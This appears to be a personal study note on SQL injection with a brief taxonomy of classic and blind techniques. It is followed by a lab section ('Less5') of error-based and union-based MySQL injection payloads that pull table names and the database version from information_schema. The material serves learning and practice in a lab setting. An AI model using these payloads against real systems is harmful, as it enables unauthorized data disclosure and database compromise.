# Sqli
    SQL injection is a code injection technique


>SQL injection attacks allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server.

- *Classic* SQLi
    - Error-based SQLi
    - Union-based SQLi
- **Blind** SQLi
    - Boolean-based (content-based) Blind SQLi
    - Time-based Blind SQLi

----

### Less5
	Error-based SQLi

``` sql
    '1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema = database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a limit 0,1)b) --+
```

``` sql
//FIXME
    '1' and (select 1 from (select count(*),group_concat(concat((select group_concat(table_name) from information_schema.tables where table_schema = database()),floor(rand()*2))a) from information_schema.tables group by a)b) --+
```

``` sql
	'1' and (select 1 from (select count(*),(floor(rand()*2))a from information_schema.tables group by a limit 0,1)b) --+
```

``` sql
    '1' and (select 1 from (select count(*),concat(version(),floor(rand()*2))a from information_schema.tables group by a limit 0,1)b) --+
```

``` sql
    '1' and extractvalue(1,concat("/",(select group_concat(table_name) from information_schema.tables where table_schema = database() limit 0,1))) --+
```

``` sql
union select 1,table_name,2 from information_schema.tables where table_schema = database() limit 0,1 --+
```
